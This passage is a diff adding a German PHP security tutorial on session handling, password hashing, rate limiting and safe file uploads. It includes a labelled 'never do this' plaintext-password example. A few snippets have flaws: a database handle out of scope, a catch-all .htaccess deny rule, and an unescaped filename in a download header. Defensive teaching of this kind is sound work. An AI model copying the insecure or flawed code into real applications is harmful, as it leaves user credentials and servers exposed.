+                        <p>Normales <code>===</code> ist anfällig für <strong>Timing-Attacks</strong> (ein Angreifer
+                            könnte am Zeitunterschied erkennen, wie viele Zeichen richtig sind).
+                            <code>hash_equals()</code> vergleicht in konstanter Zeit und ist daher sicher.
+                        </p>
+                    </div>
+
+                    <h3 id="zusaetzlicher-schutz-samesite-cookie-attribut">Zusätzlicher Schutz: SameSite-Cookie-Attribut</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// Session-Cookie-Einstellungen (am Anfang, vor session_start())
+session_set_cookie_params([
+    'lifetime' =&gt; 0,
+    'path' =&gt; '/',
+    'domain' =&gt; '', // Deine Domain
+    'secure' =&gt; true,   // Nur über HTTPS
+    'httponly' =&gt; true, // Nicht per JavaScript zugreifbar
+    'samesite' =&gt; 'Strict' // CSRF-Schutz
+]);
+
+session_start();
+?&gt;</code></pre>
+                    </div>
+                    <div class="info-box">
+                        <strong class="box-title no-toc">SameSite-Werte
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><code>Strict</code> – Cookie wird nur bei Requests von gleicher Domain gesendet (am
+                                sichersten)</li>
+                            <li><code>Lax</code> – Cookie wird bei Top-Level-Navigation gesendet (z.B. Link-Klicks)</li>
+                            <li><code>None</code> – Cookie wird immer gesendet (nur mit Secure-Flag)</li>
+                        </ul>
+                    </div>
+
+                </section>
+
+                <!-- Session Security -->
+                <section class="tutorials-content">
+                    <h2 id="session-sicherheit">Session-Sicherheit</h2>
+                    <p>Sessions sind super praktisch, um Nutzer eingeloggt zu halten – aber auch ein beliebtes
+                        Angriffsziel.</p>
+
+                    <h3 id="session-hijacking">Session Hijacking</h3>
+                    <p>Bei Session Hijacking stiehlt ein Angreifer die Session-ID eines Nutzers und gibt sich als dieser
+                        aus.</p>
+
+                    <h4>Angriffsvektoren</h4>
+                    <ul class="arrow-list grid-2col-bg">
+                        <li><strong>XSS:</strong> JavaScript stiehlt Session-Cookie <code>document.cookie</code></li>
+                        <li><strong>Network Sniffing:</strong> Session-ID wird über unverschlüsselte Verbindung
+                            abgefangen</li>
+                        <li><strong>Session Fixation:</strong> Angreifer setzt Session-ID des Opfers</li>
+                    </ul>
+
+                    <h3 id="sichere-session-konfiguration">Sichere Session-Konfiguration</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// session-config.php
+
+// 1. Vor session_start() konfigurieren
+ini_set('session.use_strict_mode', '1');      // Nur Server-generierte Session-IDs
+ini_set('session.cookie_httponly', '1');      // Kein JavaScript-Zugriff
+ini_set('session.cookie_secure', '1');        // Nur über HTTPS
+ini_set('session.use_only_cookies', '1');     // Keine Session-ID in URL
+ini_set('session.cookie_samesite', 'Strict'); // CSRF-Schutz
+
+// Oder mit session_set_cookie_params (moderner)
+session_set_cookie_params([
+    'lifetime' =&gt; 3600,     // 1 Stunde
+    'path' =&gt; '/',
+    'domain' =&gt; '',
+    'secure' =&gt; true,       // Nur HTTPS
+    'httponly' =&gt; true,     // XSS-Schutz
+    'samesite' =&gt; 'Strict'  // CSRF-Schutz
+]);
+
+// 2. Session starten
+session_start();
+
+// 3. Session-ID nach Login regenerieren (gegen Fixation)
+function regenerateSession(): void {
+    session_regenerate_id(true); // true = alte Session löschen
+}
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="komplettes-login-system-mit-security">Komplettes Login-System mit Security</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// login.php
+require_once 'session-config.php';
+require_once 'database.php';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    
+    $email = trim($_POST['email'] ?? '');
+    $password = $_POST['password'] ?? '';
+    
+    if (empty($email) || empty($password)) {
+        $error = 'Bitte alle Felder ausfüllen.';
+    } else {
+        try {
+            $pdo = getDB();
+            
+            // User aus Datenbank holen
+            $stmt = $pdo-&gt;prepare('SELECT id, email, password_hash FROM users WHERE email = :email');
+            $stmt-&gt;execute([':email' =&gt; $email]);
+            $user = $stmt-&gt;fetch();
+            
+            // Passwort prüfen
+            if ($user &amp;&amp; password_verify($password, $user['password_hash'])) {
+                
+                // Session-ID regenerieren (wichtig!)
+                session_regenerate_id(true);
+                
+                // User-Daten in Session speichern
+                $_SESSION['user_id'] = $user['id'];
+                $_SESSION['user_email'] = $user['email'];
+                $_SESSION['logged_in'] = true;
+                
+                // Optional: IP und User Agent speichern (für zusätzliche Sicherheit)
+                $_SESSION['user_ip'] = $_SERVER['REMOTE_ADDR'];
+                $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
+                
+                // Weiterleitung
+                header('Location: dashboard.php');
+                exit;
+                
+            } else {
+                // Nicht verraten, ob Email oder Passwort falsch ist!
+                $error = 'Ungültige Anmeldedaten.';
+            }
+            
+        } catch (PDOException $e) {
+            error_log('Login error: ' . $e-&gt;getMessage());
+            $error = 'Ein Fehler ist aufgetreten.';
+        }
+    }
+}
+?&gt;</code></pre>
+                    </div>
+
+
+                    <h3 id="session-validieren-bei-jedem-request">Session validieren bei jedem Request</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// auth.php - Auf jeder geschützten Seite einbinden
+
+require_once 'session-config.php';
+
+function requireLogin(): void {
+    // Prüfen, ob eingeloggt
+    if (empty($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        header('Location: login.php');
+        exit;
+    }
+    
+    // Optional: IP und User Agent validieren
+    // (kann zu Problemen führen bei dynamischen IPs oder Proxy-Wechsel)
+    if (
+        !empty($_SESSION['user_ip']) &amp;&amp; 
+        $_SESSION['user_ip'] !== $_SERVER['REMOTE_ADDR']
+    ) {
+        // Potentieller Session-Hijacking-Versuch
+        session_destroy();
+        header('Location: login.php?error=security');
+        exit;
+    }
+    
+    // Optional: Session-Timeout (z.B. nach 30 Minuten Inaktivität)
+    $timeout = 1800; // 30 Minuten in Sekunden
+    
+    if (isset($_SESSION['last_activity']) &amp;&amp; 
+        (time() - $_SESSION['last_activity']) &gt; $timeout) {
+        session_destroy();
+        header('Location: login.php?error=timeout');
+        exit;
+    }
+    
+    $_SESSION['last_activity'] = time();
+}
+
+// Auf geschützten Seiten:
+// requireLogin();
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="sicherer-logout">Sicherer Logout</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// logout.php
+require_once 'session-config.php';
+
+// Session-Variablen löschen
+$_SESSION = [];
+
+// Session-Cookie löschen
+if (ini_get('session.use_cookies')) {
+    $params = session_get_cookie_params();
+    setcookie(
+        session_name(),
+        '',
+        time() - 42000,
+        $params['path'],
+        $params['domain'],
+        $params['secure'],
+        $params['httponly']
+    );
+}
+
+// Session zerstören
+session_destroy();
+
+// Weiterleitung
+header('Location: login.php');
+exit;
+?&gt;</code></pre>
+                    </div>
+
+                    <div class="info-box warning">
+                        <strong class="box-title warning no-toc">Häufiger Fehler
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Viele Entwickler vergessen <code>session_regenerate_id()</code> nach dem Login. Das macht
+                            dich anfällig für <strong>Session Fixation</strong>-Angriffe. Immer die Session-ID nach
+                            Privilege-Changes (Login, Logout, Rollenwechsel) regenerieren!</p>
+                    </div>
+
+                </section>
+
+                <!-- Passwort-Sicherheit -->
+                <section class="tutorials-content">
+                    <h2 id="passwort-sicherheit">Passwort-Sicherheit</h2>
+                    <p>Passwörter sind die erste Verteidigungslinie – und leider oft die schwächste.</p>
+
+                    <h3 id="passwoerter-niemals-im-klartext-speichern">Passwörter NIEMALS im Klartext speichern</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">NIEMALS SO!</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" class="icon-danger" fill="var(--accent-red)" role="img" aria-label="Extrem gefährlich">
+                                <path d="M15.2,0C6.8,0,0,6.8,0,15.2s6.8,15.2,15.2,15.2,15.2-6.8,15.2-15.2S23.7,0,15.2,0ZM23.2,
+20.7c.4.4.4,1,0,1.4l-1.1,1.1c-.4.4-1,.4-1.4,0l-5.5-5.5-5.5,5.5c-.4.4-1,.4-1.4,0l-1.1-1.1c-.4-.4-.4-1,
+0-1.4l5.5-5.5-5.5-5.5c-.4-.4-.4-1,0-1.4l1.1-1.1c.4-.4,1-.4,1.4,0l5.5,5.5,5.5-5.5c.4-.4,1-.4,1.4,0l1.1,1.1c.4.4.4,1,0,1.4l-5.5,5.5,5.5,5.5Z">
+                                </path>
+                            </svg>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// NIEMALS SO!
+$password = $_POST['password'];
+$stmt = $pdo-&gt;prepare('INSERT INTO users (email, password) VALUES (:email, :password)');
+$stmt-&gt;execute([
+    ':email' =&gt; $email,
+    ':password' =&gt; $password // Klartext!
+]);
+?&gt;</code></pre>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Warum nicht?
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li>Bei Datenbank-Leak haben Angreifer alle Passwörter</li>
+                            <li>Mitarbeiter mit DB-Zugriff können Passwörter sehen</li>
+                            <li>Viele Nutzer verwenden gleiche Passwörter auf mehreren Seiten</li>
+                            <li>Es ist in vielen Ländern illegal (DSGVO!)</li>
+                        </ul>
+                    </div>
+
+                    <h3 id="passwoerter-richtig-hashen">Passwörter richtig hashen</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// RICHTIG: Password-Hashing ✓
+
+// Bei Registrierung
+$password = $_POST['password'];
+$passwordHash = password_hash($password, PASSWORD_DEFAULT);
+
+// In Datenbank speichern
+$stmt = $pdo-&gt;prepare('INSERT INTO users (email, password_hash) VALUES (:email, :password_hash)');
+$stmt-&gt;execute([
+    ':email' =&gt; $email,
+    ':password_hash' =&gt; $passwordHash
+]);
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="passwort-verifikation">Passwort-Verifikation</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// Bei Login
+$inputPassword = $_POST['password'];
+
+// Hash aus Datenbank holen
+$stmt = $pdo-&gt;prepare('SELECT password_hash FROM users WHERE email = :email');
+$stmt-&gt;execute([':email' =&gt; $_POST['email']]);
+$user = $stmt-&gt;fetch();
+
+// Passwort verifizieren
+if ($user &amp;&amp; password_verify($inputPassword, $user['password_hash'])) {
+    echo "Login erfolgreich!";
+    
+    // Optional: Hash aktualisieren, wenn neuer Algorithmus verfügbar
+    if (password_needs_rehash($user['password_hash'], PASSWORD_DEFAULT)) {
+        $newHash = password_hash($inputPassword, PASSWORD_DEFAULT);
+        // $newHash in Datenbank updaten...
+    }
+} else {
+    echo "Falsches Passwort!";
+}
+?&gt;</code></pre>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Was macht password_hash()?
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li>Nutzt aktuell bcrypt (sicher und bewährt)</li>
+                            <li>Generiert automatisch ein <strong>Salt</strong> (zufällige Daten)</li>
+                            <li>Salt wird im Hash gespeichert – kein Extra-Feld nötig</li>
+                            <li>Mit <code>PASSWORD_DEFAULT</code> nutzt PHP immer den besten verfügbaren Algorithmus
+                            </li>
+                        </ul>
+                    </div>
+
+                    <h3 id="passwort-anforderungen">Passwort-Anforderungen</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+function validatePassword(string $password): array {
+    $errors = [];
+    
+    // Mindestlänge
+    if (strlen($password) &lt; 8) {
+        $errors[] = 'Passwort muss mindestens 8 Zeichen lang sein.';
+    }
+    
+    // Maximal 72 Zeichen (bcrypt-Limit)
+    if (strlen($password) &gt; 72) {
+        $errors[] = 'Passwort darf maximal 72 Zeichen lang sein.';
+    }
+    
+    // Optional: Komplexität prüfen
+    if (!preg_match('/[A-Z]/', $password)) {
+        $errors[] = 'Passwort muss mindestens einen Großbuchstaben enthalten.';
+    }
+    
+    if (!preg_match('/[a-z]/', $password)) {
+        $errors[] = 'Passwort muss mindestens einen Kleinbuchstaben enthalten.';
+    }
+    
+    if (!preg_match('/[0-9]/', $password)) {
+        $errors[] = 'Passwort muss mindestens eine Zahl enthalten.';
+    }
+    
+    // Optional: Sonderzeichen
+    if (!preg_match('/[^A-Za-z0-9]/', $password)) {
+        $errors[] = 'Passwort muss mindestens ein Sonderzeichen enthalten.';
+    }
+    
+    return $errors;
+}
+
+// Verwendung
+$errors = validatePassword($_POST['password']);
+if (!empty($errors)) {
+    // Fehler anzeigen
+}
+?&gt;</code></pre>
+                    </div>
+
+                    <div class="info-box warning">
+                        <strong class="box-title warning no-toc">Zu strikte Regeln können kontraproduktiv sein!
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Moderne Empfehlungen (NIST, OWASP):</p>
+                        <ul class="arrow-list">
+                            <li>Mindestlänge: 8-12 Zeichen (besser: länger)</li>
+                            <li>Keine erzwungene Komplexität (führt zu "Passwort123!")</li>
+                            <li>Kein erzwungener regelmäßiger Wechsel</li>
+                            <li>Wichtiger: Passwörter gegen bekannte Listen prüfen (Have I Been Pwned API)</li>
+                        </ul>
+                    </div>
+
+                    <h3 id="brute-force-schutz-rate-limiting">Brute-Force-Schutz: Rate Limiting</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// Einfaches Rate Limiting (in Realität: Redis/Memcached nutzen)
+
+function checkLoginAttempts(string $email): bool {
+    $maxAttempts = 5;
+    $timeWindow = 900; // 15 Minuten
+    
+    // Versuche aus DB holen
+    $stmt = $pdo-&gt;prepare('
+        SELECT COUNT(*) as attempts 
+        FROM login_attempts 
+        WHERE email = :email 
+        AND attempted_at &gt; :time_limit
+    ');
+    $stmt-&gt;execute([
+        ':email' =&gt; $email,
+        ':time_limit' =&gt; date('Y-m-d H:i:s', time() - $timeWindow)
+    ]);
+    
+    $result = $stmt-&gt;fetch();
+    
+    return $result['attempts'] &lt; $maxAttempts;
+}
+
+function recordLoginAttempt(string $email, bool $success): void {
+    $stmt = $pdo-&gt;prepare('
+        INSERT INTO login_attempts (email, success, attempted_at) 
+        VALUES (:email, :success, NOW())
+    ');
+    $stmt-&gt;execute([
+        ':email' =&gt; $email,
+        ':success' =&gt; $success ? 1 : 0
+    ]);
+}
+
+// Bei Login-Versuch
+if (!checkLoginAttempts($email)) {
+    die('Zu viele Login-Versuche. Bitte warte 15 Minuten.');
+}
+
+// Nach Login-Versuch
+recordLoginAttempt($email, $loginSuccess);
+?&gt;</code></pre>
+                    </div>
+
+                    <p>Tabelle für Login-Attempts:</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">CREATE TABLE login_attempts (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    email VARCHAR(255) NOT NULL,
+    success BOOLEAN NOT NULL,
+    attempted_at DATETIME NOT NULL,
+    ip_address VARCHAR(45),
+    INDEX idx_email_time (email, attempted_at)
+);</code></pre>
+                    </div>
+
+                </section>
+
+                <!-- File Upload Security -->
+                <section class="tutorials-content">
+                    <h2 id="file-upload-sicherheit">File Upload Sicherheit</h2>
+                    <p>File-Uploads sind extrem gefährlich, wenn nicht richtig abgesichert. Ein Angreifer könnte
+                        PHP-Dateien hochladen und ausführen!</p>
+
+                    <h3 id="die-gefahren">Die Gefahren</h3>
+                    <ul class="arrow-list grid-2col-bg">
+                        <li><strong>Remote Code Execution:</strong> Angreifer lädt PHP-Shell hoch und führt beliebigen
+                            Code aus</li>
+                        <li><strong>Path Traversal:</strong> Angreifer überschreibt kritische System-Dateien</li>
+                        <li><strong>XSS via SVG/HTML:</strong> Schädliche Scripts in Bildern</li>
+                        <li><strong>DoS:</strong> Riesige Dateien füllen Server-Speicher</li>
+                    </ul>
+
+                    <h3 id="sicherer-file-upload">Sicherer File-Upload</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// file-upload.php
+
+// 1. Prüfe, ob Datei hochgeladen wurde
+if (!isset($_FILES['upload']) || $_FILES['upload']['error'] !== UPLOAD_ERR_OK) {
+    die('Fehler beim Upload.');
+}
+
+$file = $_FILES['upload'];
+
+// 2. Größe prüfen (z.B. max 5MB)
+$maxSize = 5 * 1024 * 1024; // 5MB in Bytes
+if ($file['size'] &gt; $maxSize) {
+    die('Datei zu groß. Maximum: 5MB');
+}
+
+// 3. MIME-Type validieren (nicht nur Extension!)
+$allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mimeType = finfo_file($finfo, $file['tmp_name']);
+finfo_close($finfo);
+
+if (!in_array($mimeType, $allowedMimes)) {
+    die('Dateityp nicht erlaubt.');
+}
+
+// 4. Extension validieren (zusätzlich)
+$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
+$fileExtension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+
+if (!in_array($fileExtension, $allowedExtensions)) {
+    die('Dateiendung nicht erlaubt.');
+}
+
+// 5. Sicheren Dateinamen generieren (nicht vom User übernehmen!)
+$safeFilename = bin2hex(random_bytes(16)) . '.' . $fileExtension;
+
+// 6. Upload-Verzeichnis (AUSSERHALB des Web-Root!)
+$uploadDir = '/var/www/uploads/'; // Nicht öffentlich zugänglich!
+
+// Alternative: Öffentlich, aber ohne PHP-Ausführung
+// $uploadDir = '/var/www/html/uploads/';
+// Dann .htaccess in uploads/:
+// php_flag engine off
+
+// 7. Vollständiger Pfad
+$destination = $uploadDir . $safeFilename;
+
+// 8. Datei verschieben
+if (!move_uploaded_file($file['tmp_name'], $destination)) {
+    die('Fehler beim Speichern.');
+}
+
+// 9. In Datenbank speichern
+$stmt = $pdo-&gt;prepare('
+    INSERT INTO uploads (original_name, stored_name, mime_type, size, uploaded_at) 
+    VALUES (:original, :stored, :mime, :size, NOW())
+');
+$stmt-&gt;execute([
+    ':original' =&gt; basename($file['name']), // basename() entfernt Path-Komponenten
+    ':stored' =&gt; $safeFilename,
+    ':mime' =&gt; $mimeType,
+    ':size' =&gt; $file['size']
+]);
+
+echo 'Upload erfolgreich!';
+?&gt;</code></pre>
+                    </div>
+
+                    <h3 id="upload-verzeichnis-schuetzen">Upload-Verzeichnis schützen</h3>
+
+                    <h4>Option 1: Außerhalb Web-Root (am sichersten)</h4>
+                    <p>Uploads in Verzeichnis speichern, das nicht direkt per URL erreichbar ist:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// download.php - Dateien ausliefern mit Zugriffskontrolle
+
+session_start();
+
+// Zugriff prüfen
+if (!isset($_SESSION['logged_in'])) {
+    die('Nicht berechtigt.');
+}
+
+$fileId = $_GET['id'] ?? 0;
+
+// Dateiinfo aus DB holen
+$stmt = $pdo-&gt;prepare('SELECT stored_name, original_name, mime_type FROM uploads WHERE id = :id');
+$stmt-&gt;execute([':id' =&gt; $fileId]);
+$file = $stmt-&gt;fetch();
+
+if (!$file) {
+    die('Datei nicht gefunden.');
+}
+
+$filePath = '/var/www/uploads/' . $file['stored_name'];
+
+if (!file_exists($filePath)) {
+    die('Datei nicht gefunden.');
+}
+
+// Headers setzen
+header('Content-Type: ' . $file['mime_type']);
+header('Content-Disposition: attachment; filename="' . $file['original_name'] . '"');
+header('Content-Length: ' . filesize($filePath));
+
+// Datei ausgeben
+readfile($filePath);
+exit;
+?&gt;</code></pre>
+                    </div>
+
+                    <h4>Option 2: .htaccess (wenn Web-Root nötig)</h4>
+                    <p>In <code>/uploads/.htaccess</code>:</p>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-html"># PHP-Ausführung deaktivieren
+php_flag engine off
+
+# Nur bestimmte Dateitypen erlauben
+&lt;FilesMatch "\.(jpg|jpeg|png|gif|pdf)$"&gt;
+    Order Allow,Deny
+    Allow from all
+&lt;/FilesMatch&gt;
+
+# Alle anderen Dateien blockieren
+&lt;FilesMatch ".*"&gt;
+    Order Deny,Allow
+    Deny from all
+&lt;/FilesMatch&gt;</code></pre>
+                    </div>
+
+                    <h3 id="zusaetzliche-sicherheitsmassnahmen">Zusätzliche Sicherheitsmaßnahmen</h3>
+
+                    <h4>Bildervalidierung</h4>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+// Prüfe, ob es wirklich ein Bild ist
+function isValidImage(string $filePath): bool {
+    $imageInfo = @getimagesize($filePath);
+    
+    if ($imageInfo === false) {
+        return false; // Kein Bild
+    }
+    
+    // Erlaubte Bildtypen
+    $allowedTypes = [IMAGETYPE_JPEG, IMAGETYPE_PNG, IMAGETYPE_GIF];
+    
+    return in_array($imageInfo[2], $allowedTypes);
+}
+
+// Nach Upload prüfen
+if (!isValidImage($file['tmp_name'])) {
+    unlink($file['tmp_name']); // Temp-Datei löschen
+    die('Ungültige Bilddatei.');
+}
+?&gt;</code></pre>
+                    </div>
+
+                    <h4>Dateinamen-Sanitization</h4>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-lang">PHP</span>
+                            <button class="code-copy">
+                                <span class="copy-icon">
+                                    <img src="/assets/icons/clipboard.svg" alt="Copy Icon" width="16" height="16">
+                                </span>
+                                <span class="copy-text">Kopieren</span>
+                            </button>
+                        </div>
+                        <pre><code class="language-php">&lt;?php
+function sanitizeFilename(string $filename): string {
+    // Entferne alle Zeichen außer: Buchstaben, Zahlen, Punkt, Unterstrich, Bindestrich
+    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '', $filename);
+    
+    // Entferne mehrfache Punkte (Path Traversal Schutz)
+    $filename = preg_replace('/\.+/', '.', $filename);
+    
+    // Maximal 255 Zeichen
+    return substr($filename, 0, 255);
+}
+?&gt;</code></pre>
+                    </div> 
+
+                    <div class="info-box warning">
+                        <strong class="box-title warning no-toc">Kritische Punkte bei File-Uploads
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
